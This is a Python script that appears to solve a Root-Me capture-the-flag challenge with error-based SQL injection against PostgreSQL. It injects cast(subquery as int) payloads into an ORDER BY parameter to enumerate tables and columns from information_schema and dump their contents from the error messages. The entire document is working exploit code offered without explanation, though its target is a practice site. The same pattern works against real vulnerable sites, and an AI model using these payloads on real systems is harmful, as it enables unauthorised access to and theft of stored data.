import requests as rq
def clean(s):
    return s[s.index(" integer: "):].replace("</body></html>","").replace(" integer: ","")
url="http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=desc,"
count_1=0
print("P0c SQL injection - Error (note: DBMS:postgresql): ")
for i in range(0,100):
    for j in range(0,100):
        payload_1="cast((select+table_name+from+information_schema.columns+where+table_catalog=current_database()+limit+1+offset+{0})+as+int)".format(i)
        rp_1=rq.get(url+payload_1)
        a=rp_1.text
        a=clean(a)
        payload_2="cast((select+column_name+from+information_schema.columns+where+table_catalog=current_database()+limit+1+offset+{0})+as+int)".format(j)
        rp_2=rq.get(url+payload_2)
        b=rp_2.text
        b=clean(b)
        payload_3="cast((select+{0}+from+{1}+limit+{2})+as+int)".format(b.replace('"',""),a.replace('"',""),j)
        rp_3=rq.get(url+payload_3)
        c=rp_3.text
        try:
            c=clean(c)
            print("table: " +a+" column: "+b+" data: "+c)
        except:
            pass

